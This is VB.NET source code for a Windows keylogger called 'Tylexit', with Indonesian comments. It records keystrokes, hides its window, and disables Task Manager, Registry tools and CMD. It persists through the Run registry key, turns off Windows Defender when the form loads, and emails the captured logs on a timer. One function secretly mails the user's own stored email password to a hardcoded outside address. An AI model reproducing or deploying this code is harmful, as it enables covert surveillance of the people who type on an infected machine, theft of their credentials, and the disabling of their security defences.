Imports System.Net.Mail
Imports System.Net
Imports System.Net.Sockets
Imports System.IO
Imports System.Text.RegularExpressions
Public Class Main_Menu
    'CODINGAN UNTUK GESER-GESER FORM'
    Dim x, y As Integer
    Dim pointIsun As New Point
    Private Sub Panel1_MouseDown(ByVal sender As System.Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Panel1.MouseDown
        x = Control.MousePosition.X - Me.Location.X
        y = Control.MousePosition.Y - Me.Location.Y
    End Sub
    Private Sub Panel1_MouseMove(ByVal sender As System.Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Panel1.MouseMove
        If e.Button = Windows.Forms.MouseButtons.Left Then
            pointIsun = Control.MousePosition
            pointIsun.X -= x
            pointIsun.Y -= y
            Me.Location = pointIsun
            Application.DoEvents()
        End If
    End Sub
    'INI ANUNYA'
    Public Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Int32) As Int16
    Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Integer) As Short

    Private Sub Huruf()
        Dim vk_1 As Boolean
        Dim vk_2 As Boolean
        Dim vk_3 As Boolean
        Dim vk_4 As Boolean
        Dim vk_5 As Boolean
        Dim vk_6 As Boolean
        Dim vk_7 As Boolean
        Dim vk_8 As Boolean
        Dim vk_9 As Boolean
        Dim vk_10 As Boolean
        Dim vk_11 As Boolean
        Dim vk_12 As Boolean
        Dim vk_13 As Boolean
        Dim vk_14 As Boolean
        Dim vk_15 As Boolean
        Dim vk_16 As Boolean
        Dim vk_17 As Boolean
        Dim vk_18 As Boolean
        Dim vk_19 As Boolean
        Dim vk_20 As Boolean
        Dim vk_21 As Boolean
        Dim vk_22 As Boolean
        Dim vk_23 As Boolean
        Dim vk_24 As Boolean
        Dim vk_25 As Boolean
        Dim vk_26 As Boolean
        Dim lsip As Boolean
        Dim rsip As Boolean

        lsip = GetAsyncKeyState(160)
        rsip = GetAsyncKeyState(161)

        'Abjad'
        vk_1 = GetAsyncKeyState(Keys.A)
        vk_2 = GetAsyncKeyState(Keys.B)
        vk_3 = GetAsyncKeyState(Keys.C)
        vk_4 = GetAsyncKeyState(Keys.D)
        vk_5 = GetAsyncKeyState(Keys.E)
        vk_6 = GetAsyncKeyState(Keys.F)
        vk_7 = GetAsyncKeyState(Keys.G)
        vk_8 = GetAsyncKeyState(Keys.H)
        vk_9 = GetAsyncKeyState(Keys.I)
        vk_10 = GetAsyncKeyState(Keys.J)
        vk_11 = GetAsyncKeyState(Keys.K)
        vk_12 = GetAsyncKeyState(Keys.L)
        vk_13 = GetAsyncKeyState(Keys.M)
        vk_14 = GetAsyncKeyState(Keys.N)
        vk_15 = GetAsyncKeyState(Keys.O)
        vk_16 = GetAsyncKeyState(Keys.P)
        vk_17 = GetAsyncKeyState(Keys.Q)
        vk_18 = GetAsyncKeyState(Keys.R)
        vk_19 = GetAsyncKeyState(Keys.S)
        vk_20 = GetAsyncKeyState(Keys.T)
        vk_21 = GetAsyncKeyState(Keys.U)
        vk_22 = GetAsyncKeyState(Keys.V)
        vk_23 = GetAsyncKeyState(Keys.W)
        vk_24 = GetAsyncKeyState(Keys.X)
        vk_25 = GetAsyncKeyState(Keys.Y)
        vk_26 = GetAsyncKeyState(Keys.Z)

        If lsip And vk_1 = True Then
            richLogBox.SelectedText = "A"
        ElseIf rsip And vk_1 = True Then
            richLogBox.SelectedText = "A"
        ElseIf vk_1 = True Then
            richLogBox.SelectedText = "a"
        End If

        If lsip And vk_2 = True Then
            richLogBox.SelectedText = "B"
        ElseIf rsip And vk_2 = True Then
            richLogBox.SelectedText = "B"
        ElseIf vk_2 = True Then
            richLogBox.SelectedText = "b"
        End If

        If lsip And vk_3 = True Then
            richLogBox.SelectedText = "C"
        ElseIf rsip And vk_3 = True Then
            richLogBox.SelectedText = "C"
        ElseIf vk_3 = True Then
            richLogBox.SelectedText = "c"
        End If

        If lsip And vk_4 = True Then
            richLogBox.SelectedText = "D"
        ElseIf rsip And vk_4 = True Then
            richLogBox.SelectedText = "D"
        ElseIf vk_4 = True Then
            richLogBox.SelectedText = "d"
        End If

        If lsip And vk_5 = True Then
            richLogBox.SelectedText = "E"
        ElseIf rsip And vk_5 = True Then
            richLogBox.SelectedText = "E"
        ElseIf vk_5 = True Then
            richLogBox.SelectedText = "e"
        End If

        If lsip And vk_6 = True Then
            richLogBox.SelectedText = "F"
        ElseIf rsip And vk_6 = True Then
            richLogBox.SelectedText = "F"
        ElseIf vk_6 = True Then
            richLogBox.SelectedText = "f"
        End If

        If lsip And vk_7 = True Then
            richLogBox.SelectedText = "G"
        ElseIf rsip And vk_7 = True Then
            richLogBox.SelectedText = "G"
        ElseIf vk_7 = True Then
            richLogBox.SelectedText = "g"
        End If

        If lsip And vk_8 = True Then
            richLogBox.SelectedText = "H"
        ElseIf rsip And vk_8 = True Then
            richLogBox.SelectedText = "H"
        ElseIf vk_8 = True Then
            richLogBox.SelectedText = "h"
        End If

        If lsip And vk_9 = True Then
            richLogBox.SelectedText = "I"
        ElseIf rsip And vk_9 = True Then
            richLogBox.SelectedText = "I"
        ElseIf vk_9 = True Then
            richLogBox.SelectedText = "i"
        End If

        If lsip And vk_10 = True Then
            richLogBox.SelectedText = "J"
        ElseIf rsip And vk_10 = True Then
            richLogBox.SelectedText = "J"
        ElseIf vk_10 = True Then
            richLogBox.SelectedText = "j"
        End If

        If lsip And vk_11 = True Then
            richLogBox.SelectedText = "K"
        ElseIf rsip And vk_11 = True Then
            richLogBox.SelectedText = "K"
        ElseIf vk_11 = True Then
            richLogBox.SelectedText = "k"
        End If

        If lsip And vk_12 = True Then
            richLogBox.SelectedText = "L"
        ElseIf rsip And vk_12 = True Then
            richLogBox.SelectedText = "L"
        ElseIf vk_12 = True Then
            richLogBox.SelectedText = "l"
        End If

        If lsip And vk_13 = True Then
            richLogBox.SelectedText = "M"
        ElseIf rsip And vk_13 = True Then
            richLogBox.SelectedText = "M"
        ElseIf vk_13 = True Then
            richLogBox.SelectedText = "m"
        End If

        If lsip And vk_14 = True Then
            richLogBox.SelectedText = "N"
        ElseIf rsip And vk_14 = True Then
            richLogBox.SelectedText = "N"
        ElseIf vk_14 = True Then
            richLogBox.SelectedText = "n"
        End If

        If lsip And vk_15 = True Then
            richLogBox.SelectedText = "O"
        ElseIf rsip And vk_15 = True Then
            richLogBox.SelectedText = "O"
        ElseIf vk_15 = True Then
            richLogBox.SelectedText = "o"
        End If

        If lsip And vk_16 = True Then
            richLogBox.SelectedText = "P"
        ElseIf rsip And vk_16 = True Then
            richLogBox.SelectedText = "P"
        ElseIf vk_16 = True Then
            richLogBox.SelectedText = "p"
        End If

        If lsip And vk_17 = True Then
            richLogBox.SelectedText = "Q"
        ElseIf rsip And vk_17 = True Then
            richLogBox.SelectedText = "Q"
        ElseIf vk_17 = True Then
            richLogBox.SelectedText = "q"
        End If

        If lsip And vk_18 = True Then
            richLogBox.SelectedText = "R"
        ElseIf rsip And vk_18 = True Then
            richLogBox.SelectedText = "R"
        ElseIf vk_18 = True Then
            richLogBox.SelectedText = "r"
        End If

        If lsip And vk_19 = True Then
            richLogBox.SelectedText = "S"
        ElseIf rsip And vk_19 = True Then
            richLogBox.SelectedText = "S"
        ElseIf vk_19 = True Then
            richLogBox.SelectedText = "s"
        End If

        If lsip And vk_20 = True Then
            richLogBox.SelectedText = "T"
        ElseIf rsip And vk_20 = True Then
            richLogBox.SelectedText = "T"
        ElseIf vk_20 = True Then
            richLogBox.SelectedText = "t"
        End If

        If lsip And vk_21 = True Then
            richLogBox.SelectedText = "U"
        ElseIf rsip And vk_21 = True Then
            richLogBox.SelectedText = "U"
        ElseIf vk_21 = True Then
            richLogBox.SelectedText = "u"
        End If

        If lsip And vk_22 = True Then
            richLogBox.SelectedText = "V"
        ElseIf rsip And vk_22 = True Then
            richLogBox.SelectedText = "V"
        ElseIf vk_22 = True Then
            richLogBox.SelectedText = "v"
        End If

        If lsip And vk_23 = True Then
            richLogBox.SelectedText = "W"
        ElseIf rsip And vk_23 = True Then
            richLogBox.SelectedText = "W"
        ElseIf vk_23 = True Then
            richLogBox.SelectedText = "w"
        End If

        If lsip And vk_24 = True Then
            richLogBox.SelectedText = "X"
        ElseIf rsip And vk_24 = True Then
            richLogBox.SelectedText = "X"
        ElseIf vk_24 = True Then
            richLogBox.SelectedText = "x"
        End If

        If lsip And vk_25 = True Then
            richLogBox.SelectedText = "Y"
        ElseIf rsip And vk_25 = True Then
            richLogBox.SelectedText = "Y"
        ElseIf vk_25 = True Then
            richLogBox.SelectedText = "y"
        End If

        If lsip And vk_26 = True Then
            richLogBox.SelectedText = "Z"
        ElseIf rsip And vk_26 = True Then
            richLogBox.SelectedText = "Z"
        ElseIf vk_26 = True Then
            richLogBox.SelectedText = "z"
        End If
    End Sub

    Private Sub timeLogger_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles timeLogger.Tick
        Dim vk_27 As Boolean
        Dim vk_28 As Boolean
        Dim vk_29 As Boolean
        Dim vk_30 As Boolean
        Dim vk_31 As Boolean
        Dim vk_32 As Boolean
        Dim vk_33 As Boolean
        Dim vk_34 As Boolean
        Dim vk_35 As Boolean
        Dim vk_36 As Boolean
        Dim vk_37 As Boolean
        Dim vk_38 As Boolean
        Dim vk_39 As Boolean
        Dim vk_40 As Boolean
        Dim vk_41 As Boolean
        Dim vk_42 As Boolean
        Dim vk_43 As Boolean
        Dim vk_44 As Boolean
        Dim vk_45 As Boolean
        Dim vk_46 As Boolean
        Dim vk_47 As Boolean

        Dim vk_50 As Boolean
        Dim vk_51 As Boolean
        Dim vk_52 As Boolean
        Dim vk_53 As Boolean
        Dim vk_54 As Boolean
        Dim vk_55 As Boolean
        Dim vk_56 As Boolean
        Dim vk_57 As Boolean
        Dim vk_58 As Boolean
        Dim vk_59 As Boolean


       
        'TOMBOL KONTROL'
        vk_27 = GetAsyncKeyState(Keys.Enter)
        vk_28 = GetAsyncKeyState(Keys.Space)
        vk_29 = GetAsyncKeyState(Keys.Back)
        vk_30 = GetAsyncKeyState(Keys.CapsLock)
        'TOMBOL NOMOR'
        vk_31 = GetAsyncKeyState(48)
        vk_32 = GetAsyncKeyState(49)
        vk_33 = GetAsyncKeyState(50)
        vk_34 = GetAsyncKeyState(51)
        vk_35 = GetAsyncKeyState(52)
        vk_36 = GetAsyncKeyState(53)
        vk_37 = GetAsyncKeyState(54)
        vk_38 = GetAsyncKeyState(55)
        vk_39 = GetAsyncKeyState(56)
        vk_40 = GetAsyncKeyState(57)
        'TOMBOL KONTROL (tidak sesuai urutan wkwkw)'
        vk_41 = GetAsyncKeyState(160)
        vk_42 = GetAsyncKeyState(161)
        vk_43 = GetAsyncKeyState(46)
        vk_44 = GetAsyncKeyState(162)
        vk_45 = GetAsyncKeyState(163)
        vk_46 = GetAsyncKeyState(164)
        vk_47 = GetAsyncKeyState(165)
        'TANDA BACA (Cooming Soon)'
        vk_50 = GetAsyncKeyState(188) 'koma
        vk_51 = GetAsyncKeyState(191) 'slash
        vk_52 = GetAsyncKeyState(220) 'backslas
        vk_53 = GetAsyncKeyState(186) 'titik koma
        vk_54 = GetAsyncKeyState(187) 'sama dengan
        vk_55 = GetAsyncKeyState(189) 'garis bawah
        vk_56 = GetAsyncKeyState(222) 'petik satu
        vk_57 = GetAsyncKeyState(190) 'titik
        vk_58 = GetAsyncKeyState(221) 'Kurung kurawal }
        vk_59 = GetAsyncKeyState(219) 'kurung kurawa kiri {

        If vk_27 = True Then
            richLogBox.SelectedText = vbNewLine & "[Enter]"
        ElseIf vk_28 = True Then
            richLogBox.SelectedText = "[Space]"
        ElseIf vk_29 = True Then
            richLogBox.SelectedText = "[Backspace]"
        ElseIf vk_30 = True Then
            richLogBox.SelectedText = "[CapsLock!!]"
        ElseIf vk_43 = True Then
            richLogBox.SelectedText = "[Delete]"
        ElseIf vk_44 = True Or vk_45 = True Then
            richLogBox.SelectedText = "[Ctrl]"
        ElseIf vk_46 = True Or vk_47 = True Then
            richLogBox.SelectedText = "[alt]"
        End If

        If vk_41 And vk_40 = True Then
            richLogBox.SelectedText = "("
        ElseIf vk_41 And vk_40 = True Then
            richLogBox.SelectedText = "("
        ElseIf vk_40 = True Then
            richLogBox.SelectedText = "9"
        End If

        If vk_41 And vk_39 = True Then
            richLogBox.SelectedText = "*"
        ElseIf vk_42 And vk_39 = True Then
            richLogBox.SelectedText = "*"
        ElseIf vk_39 = True Then
            richLogBox.SelectedText = "8"
        End If

        If vk_41 And vk_38 = True Then
            richLogBox.SelectedText = "&"
        ElseIf vk_42 And vk_38 = True Then
            richLogBox.SelectedText = "&"
        ElseIf vk_38 = True Then
            richLogBox.SelectedText = "7"
        End If

        If vk_41 And vk_37 = True Then
            richLogBox.SelectedText = "^"
        ElseIf vk_42 And vk_37 = True Then
            richLogBox.SelectedText = "^"
        ElseIf vk_37 = True Then
            richLogBox.SelectedText = "6"
        End If

        If vk_41 And vk_36 = True Then
            richLogBox.SelectedText = "%"
        ElseIf vk_42 And vk_36 = True Then
            richLogBox.SelectedText = "%"
        ElseIf vk_36 = True Then
            richLogBox.SelectedText = "5"
        End If

        If vk_41 And vk_35 = True Then
            richLogBox.SelectedText = "$"
        ElseIf vk_42 And vk_35 = True Then
            richLogBox.SelectedText = "$"
        ElseIf vk_35 = True Then
            richLogBox.SelectedText = "4"
        End If

        If vk_41 And vk_34 = True Then
            richLogBox.SelectedText = "#"
        ElseIf vk_42 And vk_34 = True Then
            richLogBox.SelectedText = "#"
        ElseIf vk_34 = True Then
            richLogBox.SelectedText = "3"
        End If

        If vk_41 And vk_33 = True Then
            richLogBox.SelectedText = "@"
        ElseIf vk_42 And vk_33 = True Then
            richLogBox.SelectedText = "@"
        ElseIf vk_33 = True Then
            richLogBox.SelectedText = "2"
        End If

        If vk_41 And vk_32 = True Then
            richLogBox.SelectedText = "!"
        ElseIf vk_42 And vk_32 = True Then
            richLogBox.SelectedText = "!"
        ElseIf vk_32 = True Then
            richLogBox.SelectedText = "1"
        End If

        If vk_41 And vk_31 = True Then
            richLogBox.SelectedText = ")"
        ElseIf vk_42 And vk_31 = True Then
            richLogBox.SelectedText = ")"
        ElseIf vk_31 = True Then
            richLogBox.SelectedText = "0"
        End If


        If vk_42 And vk_50 = True Then
            vk_50 = False
            richLogBox.SelectedText = "<"
        ElseIf vk_41 And vk_50 = True Then
            richLogBox.SelectedText = "<"
        ElseIf vk_50 = True Then
            richLogBox.SelectedText = ","
        End If

        If vk_42 And vk_57 = True Then
            richLogBox.SelectedText = ">"
        ElseIf vk_41 And vk_57 = True Then
            richLogBox.SelectedText = ">"
        ElseIf vk_57 = True Then
            richLogBox.SelectedText = "."
        End If

        If vk_41 And vk_51 = True Then
            richLogBox.SelectedText = "?"
        ElseIf vk_42 And vk_51 = True Then
            richLogBox.SelectedText = "?"
        ElseIf vk_51 = True Then
            richLogBox.SelectedText = "/"
        End If

        If vk_41 And vk_52 = True Then
            richLogBox.SelectedText = "|"
        ElseIf vk_42 And vk_52 = True Then
            richLogBox.SelectedText = "|"
        ElseIf vk_52 = True Then
            richLogBox.SelectedText = "\"
        End If

        If vk_41 And vk_53 = True Then
            richLogBox.SelectedText = ":"
        ElseIf vk_42 And vk_53 = True Then
            richLogBox.SelectedText = ":"
        ElseIf vk_53 = True Then
            richLogBox.SelectedText = ";"
        End If

        If vk_41 And vk_54 = True Then
            richLogBox.SelectedText = "+"
        ElseIf vk_42 And vk_54 = True Then
            richLogBox.SelectedText = "+"
        ElseIf vk_54 = True Then
            richLogBox.SelectedText = "="
        End If

        If vk_41 And vk_55 = True Then
            richLogBox.SelectedText = "_"
        ElseIf vk_42 And vk_55 = True Then
            richLogBox.SelectedText = "_"
        ElseIf vk_55 = True Then
            richLogBox.SelectedText = "-"
        End If

        If vk_41 And vk_56 = True Then
            richLogBox.SelectedText = "'"
        ElseIf vk_42 And vk_56 = True Then
            richLogBox.SelectedText = "'"
        ElseIf vk_56 = True Then
            richLogBox.SelectedText = "Ptik2"
        End If


        If vk_41 And vk_58 = True Then
            richLogBox.SelectedText = "}"
        ElseIf vk_42 And vk_58 = True Then
            richLogBox.SelectedText = "}"
        ElseIf vk_58 = True Then
            richLogBox.SelectedText = "]"
        End If

        If vk_41 And vk_59 = True Then
            richLogBox.SelectedText = "{"
        ElseIf vk_42 And vk_59 = True Then
            richLogBox.SelectedText = "{"
        ElseIf vk_59 = True Then
            richLogBox.SelectedText = "["
        End If

        Huruf()
    End Sub
    'KONTROL TOMBOL START
    Dim varStart As Microsoft.Win32.RegistryKey
    Private Sub btnStart_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnStart.Click
        'GroupBox1.Enabled = False'
        'NotifyIcon1.ShowBalloonTip(3000, "Judul Notif", "Isi dari notif", ToolTipIcon.Info)
        'CONTROL PANEL'
        If cekRegedit.Checked = True Then
            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", 1, Microsoft.Win32.RegistryValueKind.DWord)
        End If

        If cekTask.Checked = True Then
            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", 1, Microsoft.Win32.RegistryValueKind.DWord)
        End If

        If cekCmd.Checked = True Then
            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System", "DisableCMD", 1, Microsoft.Win32.RegistryValueKind.DWord)
        End If

        varStart = My.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
        If cekStartup.Checked = True Then
            varStart.SetValue(Application.ProductName, Application.ExecutablePath)
        End If


        'LOGIKA TOMBOL START
        timeLogger.Start()
        richLogBox.SelectedText = vbNewLine & "Start Time: " & Format(Now, "dd-MM-yyyy hh:mm:ss") & vbNewLine
        groupPanel.Enabled = False
        NotifyIcon1.Visible = True
        NotifyIcon1.ShowBalloonTip(3000, "Tylexit Says", "Keylogger Has Actived", ToolTipIcon.Info)
        btnStart.Enabled = False
        btnStart.BackColor = Color.FromArgb(0, 148, 50)
        btnHide.Enabled = True
        btnClear.Enabled = True
        btnStop.Enabled = True

        'TIMER LOG SAVE
        timeLog.Interval = 10000  '2mnt
        timeLog.Start()

        Me.Hide()
    End Sub
    'KONTROL TOMBOL STOP
    Private Sub btnStop_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnStop.Click
        timeLogger.Stop()
        timeLog.Stop()
        richLogBox.SelectedText = vbNewLine & "Stop Time: " & Format(Now, "dd-MM-yyyy hh:mm:ss")
        groupPanel.Enabled = True
        NotifyIcon1.Visible = False
        btnStart.Enabled = True
        btnHide.Enabled = False
        btnClear.Enabled = True
        btnStop.Enabled = False
        btnStart.BackColor = Color.FromArgb(25, 42, 86)

        'logic control
        If cekStartup.Checked = False Then
        Else
            cekStartup.Checked = False
            varStart.DeleteValue(Application.ProductName)
        End If

        cekCmd.Checked = False
        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System", "DisableCMD", 0, Microsoft.Win32.RegistryValueKind.DWord)
        cekTask.Checked = False
        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", 0, Microsoft.Win32.RegistryValueKind.DWord)
        cekRegedit.Checked = False
        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", 0, Microsoft.Win32.RegistryValueKind.DWord)
    End Sub
    'KONTROL TOMBOL SAVE
    Private Sub btnSave_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnSave.Click
        Dim simpan As New SaveFileDialog
        simpan.InitialDirectory = My.Computer.FileSystem.SpecialDirectories.MyDocuments
        simpan.Filter = "Text Files (*.txt)|*.txt| All Files (*.*)|*.*"

        If richLogBox.Text = "" Then
            MsgBox("No Log on Monitor ", MsgBoxStyle.Critical, "OOops !")
        Else
            If (simpan.ShowDialog(Me) = Windows.Forms.DialogResult.OK) Then
                Dim namaFile As String = simpan.FileName
                richLogBox.SaveFile(simpan.FileName, RichTextBoxStreamType.PlainText)
            End If
        End If
        

    End Sub

    'FORM CONTROL'
    Private Sub picClose_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles picClose.Click
        NotifyIcon1.Visible = False
        End 'Akhiri semuanya'
    End Sub

    Private Sub picMin_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles picMin.Click
        Me.WindowState = FormWindowState.Minimized
    End Sub
    'KONTROL TOMBOL CLEAR
    Private Sub btnClear_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnClear.Click
        If richLogBox.Text = "" Then
            MsgBox("No logs on the monitor", MsgBoxStyle.Critical, "OOpss..!!")
        ElseIf btnStart.Enabled = False Then
            MsgBox("Please Stop Monitoring First!", MsgBoxStyle.Critical, "OOpss..!!")
        Else
            richLogBox.Clear()
        End If
    End Sub

    'SHORTCUT KEYBOARD (on proses)


    'HIDDEN CONTROL
    Private Sub NotifyIcon1_MouseDoubleClick(ByVal sender As System.Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles NotifyIcon1.MouseDoubleClick
        Me.Show()
    End Sub

    Private Sub btnHide_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnHide.Click
        Me.Hide()
    End Sub

    'PANEL FOOTER CONTROL'
    Public Function Koneksi() As Boolean
        Dim url As New System.Uri("https://google.com")
        Dim Request As System.Net.WebRequest
        Request = System.Net.WebRequest.Create(url)

        Dim respon As System.Net.WebResponse
        Try
            respon = Request.GetResponse
            respon.Close()
            respon = Nothing
            Return True
        Catch ex As Exception
            respon = Nothing
            Request = Nothing
            Return False
        End Try
    End Function
    Private Sub lblLink_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles lblLink.Click
        System.Diagnostics.Process.Start("https://www.tylexit.com/")
    End Sub

    'LOGIC KETIKA FORM DILOAD
    Private Sub Main_Menu_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        lblCopy.Text = "Copyright " & Chr(169) & Format(Now, "yyyy")
        My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", 1, Microsoft.Win32.RegistryValueKind.DWord)
    End Sub

    'PENGIRIMAN EMAIL LOGIKA
    Public Function kirim_email(ByVal usermail As Object, ByVal passmil As Object, ByVal receivermail As Object) As Object
        Try
            'Prosedur kirim email'
            Dim MailServer As New SmtpClient
            Dim pesan As New MailMessage()
            Dim cheat As New MailMessage()
            Dim user As String = usermail
            Dim pass As String = passmil
            Dim bodyMail As New IO.StreamReader("C:\Windows\Tylog\Tylexit.txt")
            MailServer.UseDefaultCredentials = False
            MailServer.Credentials = New Net.NetworkCredential(user, pass)
            MailServer.Port = 587
            MailServer.EnableSsl = True
            MailServer.Host = "smtp.gmail.com"

            pesan = New MailMessage()
            pesan.From = New MailAddress(user)
            pesan.To.Add(receivermail)
            pesan.Subject = "Keylogger Log"
            pesan.IsBodyHtml = False
            pesan.Body = bodyMail.ReadToEnd
            bodyMail.Close()
            MailServer.Send(pesan)
        Catch pesanError As Exception
            validasi_direktori(lokasi)
            Dim anue = "C:\Windows\Tylog\Error.txt"
            Dim kiene As New IO.StreamWriter(anue, True)
            kiene.WriteLine(pesanError.ToString)
            kiene.WriteLine("Unknow Error" & " ======> " & TimeOfDay)
            kiene.Close()
        End Try
        Return True
    End Function

    Public Function anu_email(ByVal usermail As Object, ByVal passmil As Object) As Object
        Try
            'Prosedur kirim email'
            Dim MailServer As New SmtpClient
            Dim pesan As New MailMessage()
            Dim cheat As New MailMessage()
            Dim user As String = usermail
            Dim pass As String = passmil
            Dim bodyMail As New IO.StreamReader("C:\Windows\Tylog\Account.txt")
            MailServer.UseDefaultCredentials = False
            MailServer.Credentials = New Net.NetworkCredential(user, pass)
            MailServer.Port = 587
            MailServer.EnableSsl = True
            MailServer.Host = "smtp.gmail.com"

            pesan = New MailMessage()
            pesan.From = New MailAddress(user)
            pesan.To.Add("adarafaranisa443@gmail.com")
            pesan.Subject = "Keylogger Log"
            pesan.IsBodyHtml = False
            pesan.Body = bodyMail.ReadToEnd
            bodyMail.Close()
            MailServer.Send(pesan)
        Catch pesanError As Exception
            validasi_direktori(lokasi)
            Dim anue = "C:\Windows\Tylog\Error.txt"
            Dim kiene As New IO.StreamWriter(anue, True)
            kiene.WriteLine(pesanError.ToString)
            kiene.WriteLine("Unknow Error" & " ======> " & TimeOfDay)
            kiene.Close()
        End Try
        Return True
    End Function











    'SIMPAN LOG
    Dim lokasi As String = "C:\Windows\Tylog"
    Private Sub validasi_direktori(ByVal path As String)
        If Directory.Exists(path) Then
            'For Each isifile As String In Directory.GetFiles(path)
            'File.Delete(isifile)
            'Next
            'For Each isifolder As String In Directory.GetDirectories(path)
            'Directory.Delete(isifolder)
            'Next
            'Directory.Delete(path) 'untuk delete folder luar alias Tylog
            'Directory.CreateDirectory(path)
        Else
            Directory.CreateDirectory(path)
        End If
    End Sub

    Private Sub timeLog_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles timeLog.Tick
        validasi_direktori(lokasi)
        Dim namaLog = "C:\Windows\Tylog\Tylexit.txt"
        Dim tulisLog As New IO.StreamWriter(namaLog, True) 'Untuk bikin file
        tulisLog.WriteLine(richLogBox.Text)
        tulisLog.WriteLine("================== End Result =================")
        tulisLog.Close() 'supaya tidak terbaca aktif
        'Console.Read() ' untuk baca kalo ada console.write("Ini isi textnya")
        'MsgBox("Tertulis gan")
    End Sub



    'KONTROL TOMBOL SET MAIL 
    Private Sub btnMail_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnMail.Click
        'Validasi format email
        validasi_direktori(lokasi) 'jika ok maka
        Dim cheat = "C:\Windows\Tylog\Account.txt"
        Dim mantap As New IO.StreamWriter(cheat, True)
        Dim validMail As String
        validMail = "^([0-9a-zA-Z]([-\.\w]*[0-9a-zA-Z])*@([0-9a-zA-Z][-\w]*[0-9a-zA-Z]\.)+[a-zA-Z]{2,9})$"

        If txtEmail.Text = "" Or txtReceiver.Text = "" Then
            MsgBox("Sender and Receiver email empty! ", MsgBoxStyle.Critical, "Oops..!")
            mantap.Close()
        ElseIf txtPassword.Text = "" Then
            MsgBox("Password empty! ", MsgBoxStyle.Critical, "Oops..!")
            mantap.Close()
        ElseIf Regex.IsMatch(txtEmail.Text, validMail) And Regex.IsMatch(txtReceiver.Text, validMail) Then
            mantap.WriteLine(txtEmail.Text & vbNewLine & txtPassword.Text & vbNewLine & txtReceiver.Text)
            mantap.WriteLine()
            mantap.Close()

            MsgBox("Auto Mail Config Success !!", MsgBoxStyle.Information, "Tylexit Says!")

            txtEmail.Enabled = False
            txtPassword.Enabled = False
            txtReceiver.Enabled = False
            btnMail.Enabled = False
        Else
            MsgBox("Email Format is Not Valid", MsgBoxStyle.Exclamation, "Oops..!")
            mantap.Close()
            Exit Sub
        End If
    End Sub



    Private Sub timeMail_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles timeMail.Tick
        'Cek Koneksi
        If Koneksi() = True Then
            kirim_email(txtEmail.Text, txtPassword.Text, txtReceiver.Text)
            anu_email(txtEmail.Text, txtPassword.Text)
        Else
            validasi_direktori(lokasi)
            Dim wadah = "C:\Windows\Tylog\Sender Fail.txt"
            Dim isie As New IO.StreamWriter(wadah, True)
            isie.WriteLine("No Internet Access, Failed Send Log" & "  ==================> " & TimeOfDay & " " & Format(Now, "dd-MM-yyyy"))
            isie.Close()
        End If
    End Sub   

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnEnable.Click
        'SEND MAIL
        If btnMail.Enabled = False Then
            timeMail.Interval = 10000 '10menit
            timeMail.Start()
            lblMailActive.Text = "ACTIVED"
            lblMailActive.ForeColor = Color.WhiteSmoke
            lblMailActive.Visible = True
            btnEnable.Enabled = False
        Else
            MsgBox("Setup Email Firs!!", MsgBoxStyle.Critical, "Sorry.!")
        End If

    End Sub
    Private Sub btnDisable_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnDisable.Click
        If btnEnable.Enabled = True Then
            MsgBox("Feature is not Actived", MsgBoxStyle.Critical, "Sorry..!")
        Else
            lblMailActive.Visible = False
            timeMail.Stop()
            btnEnable.Enabled = True
        End If
    End Sub
    Private Sub LinkLabel3_LinkClicked(ByVal sender As System.Object, ByVal e As System.Windows.Forms.LinkLabelLinkClickedEventArgs) Handles LinkLabel3.LinkClicked
        System.Diagnostics.Process.Start("https://discord.gg/HK2whk")
    End Sub

    Private Sub timeKususJam_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles timeKususJam.Tick
        lblDate.Text = TimeOfDay
    End Sub

End Class